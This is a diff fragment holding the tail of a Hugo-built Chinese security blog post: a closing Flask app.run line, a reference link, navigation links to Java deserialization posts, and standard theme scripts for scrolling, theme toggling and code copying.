+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+</span></span></code></pre></div><blockquote>
+<p>参考：https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7Ki%3D%3DWhbCCeC84D#toc-4</p>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>jdk17&amp;CC链下利用TemplatesImpl</span>
+  </a>
+  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/bypass_waf/utf-8-overlong-encoding-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>UTF-8 Overlong Encoding-Java反序列化</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
